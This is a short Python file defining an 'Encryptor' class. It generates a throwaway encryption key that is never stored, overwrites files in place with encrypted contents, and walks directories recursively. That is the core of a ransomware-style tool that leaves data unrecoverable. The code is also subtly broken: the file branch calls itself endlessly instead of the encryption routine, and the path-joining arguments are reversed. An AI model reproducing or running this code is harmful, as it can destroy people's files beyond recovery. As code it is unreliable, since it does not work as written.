from cryptography.fernet import Fernet
from os import listdir
from os.path import isfile, join


class Encryptor:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)

    def encrypt_file(self, path):
        with open(path, 'rb') as f:
            original = f.read()
        encrypted = self.fernet.encrypt(original)
        with open(path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

    def encrypt(self, path):
        if isfile(path):
            self.encrypt(path)
            return 1
        s = 0
        for f in listdir(path):
            s += self.encrypt(join(f, path))
        return s




